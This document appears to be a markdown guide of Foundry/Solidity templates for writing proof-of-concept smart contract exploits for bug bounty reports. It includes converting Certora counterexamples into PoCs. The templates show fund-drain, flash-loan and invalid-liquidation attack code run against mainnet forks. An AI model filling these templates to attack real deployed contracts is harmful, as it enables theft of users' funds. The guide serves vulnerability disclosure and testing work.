# Practical PoC Template for Vulnerability Demonstration

**Quick Guide for You:**

If you're writing your own PoC:

1. Scroll to "Template 1" or "Template 2" sections
2. Copy the entire template code
3. Find these lines and replace them:

```solidity
import {VulnerableContract} from "src/VulnerableContract.sol"; // Change this
target.vulnerableFunction(); // Change this to your exploit
```
4. Run the test

**If asking AI (like me) to write it:**

1. Tell me: "I found a bug in Vault.sol where withdraw() doesn't check balances"
2. Tell me: "Use Template 1 from POC_TEMPLATE.md"
3. I'll generate the complete working code
4. You just review and run it

## How to Use This Template

**Start here:** Do you want to write the PoC yourself or have AI help you?

---

### Option 1: Write PoC Yourself (Recommended for Learning)

**Steps:**
1. Scroll down to **"Quick Decision"** section
2. Answer: "Does the attacker extract value?" → Choose Template 1 or 2
3. Copy the chosen template code
4. Replace the placeholder parts:
   - `VulnerableContract` → Your actual contract name
   - `testExploit()` → Your actual attack steps
   - `address constant MAINNET_VAULT = 0x...` → Real addresses
5. Run: `forge test --match-test testExploit -vvv`

**Example of what to replace:**
```solidity
// Template says:
target.vulnerableFunction();

// You write:
target.withdraw(type(uint256).max); // Your actual exploit
```

---

### Option 2: Have AI Write PoC for You

**When to use:** You have the vulnerability analysis ready but want AI to generate the code.

**Steps:**
1. First, write down your vulnerability details (see format below)
2. Copy that analysis + one of the templates below
3. Ask AI: "Generate a PoC using this template and vulnerability details"
4. Review and test the generated code

**Format your vulnerability analysis like this:**

```
I found a vulnerability in [Contract]:

CONTRACT: contracts/Vault.sol
FUNCTION: withdraw(uint256 amount)
ROOT CAUSE: Missing balance check allows withdrawal of more than deposited
IMPACT: Attacker can drain vault funds
ATTACK STEPS:
  1. Deposit 100 tokens
  2. Call withdraw(1000 tokens) - doesn't revert
  3. Attacker receives 1000 tokens, vault loses 900

TEMPLATE TO USE: Template 1 (Value Extraction)
```

**Then ask AI:**
```
Generate a practical Foundry PoC for this vulnerability using Template 1.

[Paste your vulnerability analysis above]

Requirements:
- Fork mainnet at block 19500000
- Attacker starts with 1000 tokens from whale
- Demonstrate the 900 token profit
```

**Important:** Always review AI-generated code for:
- Correct import paths
- Realistic values
- No `vm.store()` on target contract
- Proper assertions

---

## Using This Template with Certora Findings

When Certora finds a real bug and you want to write a PoC to demonstrate it:

### Step 1: Analyze the Counterexample

From the Certora output, extract:
- **Rule that failed:** Which invariant/rule was violated?
- **Call trace:** What sequence of functions led to the violation?
- **State that broke:** What values changed incorrectly?
- **Arguments used:** What inputs triggered the bug?

### Step 2: Translate to Vulnerability Description

```
CERTORA FINDING:
Rule: [invariant_name or rule_name]
Contract: [Contract.sol]
Function: [vulnerableFunction]
Violation: [What invariant was broken]

ROOT CAUSE:
[Extract from call trace - what code path executed incorrectly]

IMPACT:
[What does this violation mean in real terms - theft, DoS, insolvency?]
```

### Step 3: Choose PoC Template

- If Certora shows balance/supply violation → Use **Template 1 (Value Extraction)**

---

## Converting Anti-Invariant CEs to Exploit PoCs (v3.0)

When an **offensive verification anti-invariant** (from `impact-spec-template.md`) produces a counterexample, the CE contains concrete exploit parameters. This section maps each anti-invariant to a PoC structure.

### Anti-Invariant CE → PoC Mapping

| Anti-Invariant Rule | CE Contains | PoC Template | Key Assertion |
|---------------------|-------------|--------------|---------------|
| `attacker_cannot_profit` | Function, args, `actor_value` before/after | Template 1 (Value Extraction) | `assertGt(profit, 0)` |
| `system_value_conserved` | Function, args, `total_system_value` delta | Template 1 (Value Extraction) | `assertLt(vaultAfter, vaultBefore)` |
| `zero_sum_transfers` | Two addresses, value changes, net imbalance | Template 1 (Value Extraction) | `assertGt(callerDelta + otherDelta + systemDelta, 0)` |
| `flash_loan_attack_search` | 3 envs, function, borrow amount, profit | Template 1 + flash loan pattern | `assertGt(profit, flashLoanFee)` |
| `sandwich_attack_search` | 3 txs, attacker/victim addresses, profit/loss | Template 1 + multi-tx pattern | `assertGt(attackerProfit, 0)` |
| `staged_attack_accumulation` | 3 envs across blocks, phase deltas, total profit | Template 1 + multi-tx pattern | `assertGt(totalProfit, 0)` |

### Step-by-Step: `attacker_cannot_profit` CE → Foundry PoC

This is the most common anti-invariant to produce actionable CEs.

**1. Extract from CE call trace:**

```
CE Output:
  Rule: attacker_cannot_profit
  Status: VIOLATED
  
  Environment:
    e.msg.sender = 0x1234...  (attacker)
    e.msg.value  = 0
    e.block.number = 19500000
  
  Function called: withdraw(uint256)
  Arguments: [2000000000000000000000]  (2000 * 10^18)
  
  Ghost values:
    actor_value[0x1234...] BEFORE = 1000000000000000000000  (1000 * 10^18)
    actor_value[0x1234...] AFTER  = 3000000000000000000000  (3000 * 10^18)
  
  Profit = 2000 * 10^18
```

**2. Translate to Foundry PoC:**

```solidity
function testExploit_attacker_cannot_profit() external {
    // Setup: replicate CE initial state
    address attacker = makeAddr("attacker");
    deal(address(token), attacker, 1000e18);  // CE initial balance

    vm.startPrank(attacker);
    token.approve(address(vault), type(uint256).max);
    vault.deposit(1000e18);  // Establish position

    // Snapshot before exploit
    uint256 balanceBefore = token.balanceOf(attacker);

    // Execute: replicate CE function call with CE arguments
    vault.withdraw(2000e18);  // CE argument: 2000 * 10^18

    vm.stopPrank();

    // Assert: replicate CE profit
    uint256 balanceAfter = token.balanceOf(attacker);
    uint256 profit = balanceAfter - balanceBefore;

    console2.log("Profit:", profit / 1e18, "tokens");
    assertGt(profit, 0, "Exploit: attacker profited");
}
```

**3. If PoC fails on fork:**

| PoC Failure | Root Cause | Fix |
|-------------|-----------|-----|
| Reverts at withdraw | CE used over-approximate state | Check if CE requires specific storage setup |
| Profit is 0 | Hooks were incomplete (capture different token) | Verify hook liveness passed for this function |
| Different profit amount | CE used `mathint` (no overflow); Solidity uses `uint256` | Check for overflow at boundary values |
| Gas exceeds block limit | CE doesn't model gas | Measure gas; check if attack is economical |

### Step-by-Step: Multi-Step CE → Foundry PoC

For `flash_loan_attack_search` or `sandwich_attack_search` CEs:

```solidity
function testExploit_flash_loan_attack() external {
    address attacker = makeAddr("attacker");

    // CE: 3 steps in same block
    vm.startPrank(attacker);

    // Step 1: Flash loan (from CE e_borrow)
    flashLoanProvider.flashLoan(
        address(this),
        address(token),
        1000000e18,  // CE: borrow_amount
        ""
    );
    // Inside callback:
    //   Step 2: Attack (from CE f called with args)
    //   vault.withdraw(2000000e18);
    //   Step 3: Repay flash loan

    vm.stopPrank();

    // Verify profit after flash loan repaid
    assertGt(token.balanceOf(attacker), 0, "Flash loan attack profitable");
}

// Flash loan callback
function onFlashLoan(
    address initiator,
    address tkn,
    uint256 amount,
    uint256 fee,
    bytes calldata
) external returns (bytes32) {
    // Step 2: CE attack function with CE args
    IERC20(tkn).approve(address(vault), type(uint256).max);
    vault.deposit(amount);
    vault.withdraw(amount * 2);  // CE argument

    // Step 3: Repay
    IERC20(tkn).approve(msg.sender, amount + fee);
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

### `satisfy` Witness → Foundry PoC

When `find_profitable_inputs` returns SAT, the **witness** (not counterexample) contains exploit parameters:

| CE vs Witness | Source | Meaning |
|---------------|--------|---------|
| **Counterexample** (from `assert`) | Rule VIOLATED | Proof of bug — concrete values that break the property |
| **Witness** (from `satisfy`) | Rule SAT | Existence proof — concrete values that satisfy the condition |

Both contain the same fields (env, function, args, ghost values). The PoC conversion process is identical.

- If Certora shows access control bypass → Use **Template 2 (Invariant Break)**

### Step 4: Map Call Trace to PoC

Take the Certora call trace and convert to Foundry test. For example,

```solidity
// Certora found: deposit(1000) → withdraw(2000) → VIOLATION

function testFinding() public {
    vm.startPrank(attacker);
    
    // Replicate exact sequence from Certora
    target.deposit(1000e18);
    target.withdraw(2000e18); // Should fail but doesn't
    
    vm.stopPrank();
    
    // Verify the violation Certora found
    assertGt(token.balanceOf(attacker), 1000e18, "Attacker withdrew more than deposited");
}
```

### Example: Complete Workflow

```
1. Certora reports: "invariant_solvency VIOLATED"
   Call trace: user deposits 100 tokens → price manipulated → withdraws 200 tokens

2. You analyze: This is an oracle manipulation leading to value extraction

3. You choose: Template 1 (Value Extraction)

4. You write PoC:
   - setUp(): Fork mainnet, get oracle address
   - testExploit(): 
     a. Deposit 100 tokens
     b. Manipulate oracle price (if possible externally)
     c. Withdraw based on manipulated price
     d. Assert profit > 0

5. You run: forge test --match-test testExploit -vvv

6. Result: PoC confirms Certora finding is exploitable on-chain
```

---

## Quick Decision: What Type of Bug?

Before writing code, answer one question:

**Does the attacker extract value (tokens/ETH)?**
- **Yes** → Write a **Value Extraction PoC**
- **No** → Write an **Invariant Break PoC** (unauthorized execution)

That's it. Don't overthink it.

---

## Template 1: Value Extraction PoC

Use this for fund extraction when the attacker steals/drains/mints tokens or ETH etc.

### Minimal Working Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

import {VulnerableContract} from "src/VulnerableContract.sol";
import {IERC20} from "src/interfaces/IERC20.sol";
import {...}
import {...}
/**
 * @title ExploitPoC
 *
 * @notice
 *  Demonstrating funds-extraction vulnerabilities
 *  in a way that is fully real without any false assumption.
 *
 *  Impact Requirement (paraphrased):
 *  ------------------------------------------------------------
 *  “The vulnerability must result in a direct loss of funds
 *   for users or the protocol, with a measurable economic impact.”
 *
 *  This enforces that requirement by:
 *   - Snapshotting attacker and victim balances pre-exploit
 *   - Executing the exploit
 *   - Asserting attacker profit > 0
 *   - Asserting victim loss > 0
 *
 *  If either condition fails, the PoC fails.
 */
contract ExploitTest is Test {
    /*//////////////////////////////////////////////////////////////
                                SETUP
    //////////////////////////////////////////////////////////////*/

    VulnerableContract public target;
    IERC20 public token;

    address public attacker;
    address public victim;

    address constant MAINNET_TOKEN = 0x...;
    address constant MAINNET_VAULT = 0x...;
    uint256 constant FORK_BLOCK = 19_500_000;

    bool internal snapshotted;

    struct BalanceSnapshot {
        address token;           // Asset being tracked (ERC20, LP token, etc.)
        uint256 attackerBefore;  // Attacker balance before exploit
        uint256 victimBefore;    // Victim / protocol balance before exploit
    }

    BalanceSnapshot[] internal snapshots;

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), FORK_BLOCK);

        target = VulnerableContract(MAINNET_VAULT);
        token = IERC20(MAINNET_TOKEN);

        attacker = makeAddr("attacker");
        victim = address(target);

        vm.deal(attacker, 10 ether);

        // Seed ONLY the capital required to trigger the exploit
        address whale = 0x...;
        vm.prank(whale);
        token.transfer(attacker, 1_000e18);

        vm.label(attacker, "Attacker");
        vm.label(address(target), "VulnerableVault");
        vm.label(address(token), "Token");
    }

    /*//////////////////////////////////////////////////////////////
                        PHASE 1 — SNAPSHOT
    //////////////////////////////////////////////////////////////*/
    /**
     * @notice Records pre-exploit balances.
     *
     * @dev
     *  This MUST be called after any seed funding required
     *  to trigger the exploit, and BEFORE exploit execution.
     *
     *  This ensures seed capital is not miscounted as profit.
     */
    function snapshotBalances(address _token) internal {
        require(!snapshotted, "Snapshot already taken");

        snapshots.push(
            BalanceSnapshot({
                token: _token,
                attackerBefore: IERC20(_token).balanceOf(attacker),
                victimBefore: IERC20(_token).balanceOf(victim)
            })
        );

        snapshotted = true;
    }

    /*//////////////////////////////////////////////////////////////
                        PHASE 2 — EXPLOIT
    //////////////////////////////////////////////////////////////*/

    function executeExploit() internal {
        require(snapshotted, "Snapshot not taken");

        vm.startPrank(attacker);

        token.approve(address(target), type(uint256).max);

        // Step 1: Legitimate interaction
        target.deposit(1_000e18);

        // Step 2: Trigger vulnerability
        target.vulnerableFunction();

        // Step 3: Extract funds
        target.withdraw(target.balanceOf(attacker));

        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                        PHASE 3 — ASSERTIONS
    //////////////////////////////////////////////////////////////*/

    function assertEconomicImpact() internal {
        bool hasProfit;
        bool victimHarmed;

        for (uint256 i = 0; i < snapshots.length; i++) {
            BalanceSnapshot memory s = snapshots[i];

            uint256 attackerAfter =
                IERC20(s.token).balanceOf(attacker);
            uint256 victimAfter =
                IERC20(s.token).balanceOf(victim);

            uint256 profit = attackerAfter - s.attackerBefore;
            uint256 loss = s.victimBefore - victimAfter;

            console2.log("\nToken:", s.token);
            console2.log("Attacker profit:", profit / 1e18);
            console2.log("Victim loss:", loss / 1e18);

            if (profit > 0) hasProfit = true;
            if (loss > 0) victimHarmed = true;
        }

        require(hasProfit, "PoC: attacker did not profit");
        require(victimHarmed, "PoC: victim did not lose funds");
    }

    /*//////////////////////////////////////////////////////////////
                            TEST ENTRY
    //////////////////////////////////////////////////////////////*/

    function testExploit() external {
        snapshotBalances(address(token));
        executeExploit();
        assertEconomicImpact();
    }
}
```

### What to Customize

1. **Imports** - Add your actual contract imports
2. **setUp()** - Choose fork or local deployment
3. **Initial tokens** - Get tokens via whale or protocol functions
4. **testExploit()** - Replace with your actual attack steps
5. **Assertions** - Verify the specific impact you're demonstrating

---

## Template 2: Invariant Break PoC (No Value Transfer)

Use this when the attacker triggers unauthorized execution but doesn't extract value directly.

Examples:
- Liquidating a solvent position
- Bypassing access control
- Breaking a safety check
- Permanent DoS or griefing

### Minimal Working Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {VulnerableContract} from "src/VulnerableContract.sol";
import {InvariantBreakHarness} from "./InvariantBreakHarness.sol";

contract InvalidLiquidationTest is InvariantBreakHarness {
    VulnerableContract public target;

// Local PoC
    function setUp() public {
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");

        target = new VulnerableContract();

        // Victim enters a protected / safe state
        vm.prank(victim);
        target.createSafePosition();

        vm.deal(attacker, 1 ether);

        vm.label(attacker, "Attacker");
        vm.label(victim, "Victim");
        vm.label(address(target), "VulnerableProtocol");
    }

// Mainnet PoC (fork)
    function setUp() public {
    vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), 19_500_000);

    attacker = makeAddr("attacker");
    victim = 0xREAL_USER;

    target = VulnerableContract(0xDEPLOYED_ADDRESS);

    require(target.isSolvent(victim), "Victim not solvent");
    }

    /*//////////////////////////////////////////////////////////////
                        INVARIANT DEFINITION
    //////////////////////////////////////////////////////////////*/

    /**
     * INVARIANT:
     *  Solvent positions MUST NOT be liquidatable.
     */
    function _invariantHolds() internal view override returns (bool) {
        return target.isSolvent(victim);
    }

    /*//////////////////////////////////////////////////////////////
                    UNAUTHORIZED ACTION
    //////////////////////////////////////////////////////////////*/

    /**
     * @dev
     *  This call should be impossible while the invariant holds.
     *  Its success proves unauthorized execution.
     */
    function _executeUnauthorizedAction() internal override {
        target.liquidate(victim);
    }

    /*//////////////////////////////////////////////////////////////
                        DOWNSTREAM IMPACT
    //////////////////////////////////////////////////////////////*/

    /**
     * @dev
     *  Liquidation of a solvent position causes forced penalty / loss.
     *  This satisfies Immunefi’s impact requirement even if
     *  the attacker does not receive funds directly.
     */
    function _computeImpact() internal view override returns (uint256) {
        return target.calculateLiquidationPenalty(victim);
    }

    /*//////////////////////////////////////////////////////////////
                            TEST ENTRY
    //////////////////////////////////////////////////////////////*/

    function testInvalidLiquidation() external {
        _assertInvariantBreak();
    }
}
```

### When to Use This Template

Use **Invariant Break** template when:
- The bug allows calling a protected function
- Execution reaches unauthorized code paths
- A safety check is bypassed
- The impact is griefing/DoS/breaking protocol state

**Important:** You still need to show **real harm**:
- Show what function executed that shouldn't have
- Show the victim's loss or protocol damage
- Show why this matters economically
- Proves unauthorized execution + concrete harm

| Dimension                    | Refactored              |
| ---------------------------- | ----------------------- |
| Invariant formalization      | **Explicit & enforced** |
| Unauthorized execution proof | **Structural**          |
| Impact requirement           | **Mandatory**           |
| Reusability                  | **High**                |
| Judge clarity                | **Very High**           |
---

## Common Patterns & Helpers

### Pattern 1: Get Tokens from Whale

```solidity
function fundAttackerFromWhale(address token, uint256 amount) internal {
    // Find whale on Etherscan (holder with largest balance)
    address whale = 0x...; // Top holder address
    
    uint256 whaleBalance = IERC20(token).balanceOf(whale);
    require(whaleBalance >= amount, "Whale insufficient");
    
    vm.prank(whale);
    IERC20(token).transfer(attacker, amount);
}
```

### Pattern 2: Measure Gas Cost

```solidity
function testExploitWithGasTracking() public {
    uint256 gasBefore = gasleft();
    
    vm.prank(attacker);
    target.exploit();
    
    uint256 gasUsed = gasBefore - gasleft();
    console.log("Gas used:", gasUsed);
    console.log("Gas cost (at 50 gwei):", (gasUsed * 50 gwei) / 1e18, "ETH");
}
```

### Pattern 3: Time-Based Exploits

```solidity
function testExploitRequiresTimeDelay() public {
    // Setup vulnerable state
    vm.prank(attacker);
    target.setupAttack();
    
    // Wait for condition
    vm.warp(block.timestamp + 1 days);
    
    // Execute
    vm.prank(attacker);
    target.executeAttack();
    
    // Verify
    assertGt(token.balanceOf(attacker), 0);
}
```

### Pattern 4: Multi-Transaction Attack

```solidity
function testMultiTxExploit() public {
    // Transaction 1: Setup
    vm.prank(attacker);
    target.txStep1();
    
    // Simulate block advancement (if needed)
    vm.roll(block.number + 1);
    
    // Transaction 2: Exploit
    vm.prank(attacker);
    target.txStep2();
    
    // Transaction 3: Extract
    vm.prank(attacker);
    target.txStep3();
    
    // Verify final state
    assertGt(token.balanceOf(attacker), initialBalance);
}
```
---

## Rules for Realistic PoCs

### ✅ DO:

1. **Start from real state** - Fork mainnet or deploy fresh
2. **Use public functions** - Only call what any user can call
3. **Show the profit** - Actual token/ETH numbers
4. **Keep it minimal** - Shortest path to demonstrate the bug
5. **Console.log key steps** - Help reviewers understand the flow

### ❌ DON'T:

1. **Don't use `vm.store()` on target contract** - Can't change deployed contract storage
2. **Don't use `vm.mockCall()` on in-scope contracts** - Mocking target contract behavior makes the PoC unrealistic
3. **Don't give attacker special powers** - No admin roles, no direct storage writes
4. **Don't skip critical steps** - If exploit needs setup, show it
5. **Don't use unrealistic amounts** - Keep token amounts reasonable
6. **Don't over-comment** - Code should be self-explanatory

### Special Case: When `vm.store()` Is OK

Only use `vm.store()` to model **historical state** that could have existed:

```solidity
// ✅ ACCEPTABLE: Modeling past checkpoint that wasn't revalidated
function testStaleCheckpointExploit() public {
    // This checkpoint could have been set 30 days ago
    uint256 oldCheckpoint = block.timestamp - 30 days;
    
    // Store it to simulate the past state
    vm.store(
        address(target),
        bytes32(uint256(5)), // checkpoint slot
        bytes32(oldCheckpoint)
    );
    
    // Now show the bug: protocol doesn't revalidate this old data
    vm.prank(attacker);
    target.useCheckpoint(); // This shouldn't work but does
    
    // Show the harm
    assertGt(token.balanceOf(attacker), 0);
}
```

---

## Running Your PoC

### Basic Run

```bash
# Local deployment
forge test --match-test testExploit -vvv

# Mainnet fork
forge test --match-test testExploit --fork-url $MAINNET_RPC_URL -vvv
```

### With Gas Report

```bash
forge test --match-test testExploit --fork-url $MAINNET_RPC_URL --gas-report
```

### Debug Mode (Full Traces)

```bash
forge test --match-test testExploit --fork-url $MAINNET_RPC_URL -vvvvv
```

### Specific Block

```bash
forge test --match-test testExploit --fork-url $MAINNET_RPC_URL --fork-block-number 19500000
```

---

## Checklist Before Submitting

Quick checks:

- [ ] PoC runs with `forge test` without errors
- [ ] Attacker starts with realistic resources (just gas + maybe some tokens)
- [ ] No `vm.store()` on target contract (unless justified)
- [ ] Console logs show before/after state clearly
- [ ] Reduce Console logs to what is only important for the judger to understand the exploit
- [ ] Assertions prove the exploit worked
- [ ] Gas cost is reasonable (<5M gas if possible)
- [ ] Works on mainnet fork with real addresses or the realistic local deployment
- [ ] No unnecessary complexity - keep it as simple as possible to demonstrate the bug
- [ ] Code is minimal - no unnecessary complexity

---

## Summary

**For most bugs:** Use **Value Extraction Template**
**For access control / invariant bugs:** Use **Invariant Break Template**

**Keep it simple:**
1. Setup realistic state
2. Execute the exploit
3. Show the impact with console.logs
4. Verify with assertions

**The PoC should answer one question:**
"Can an attacker with no special privileges exploit this to cause real harm?"

If the answer is yes, you've written a good PoC.
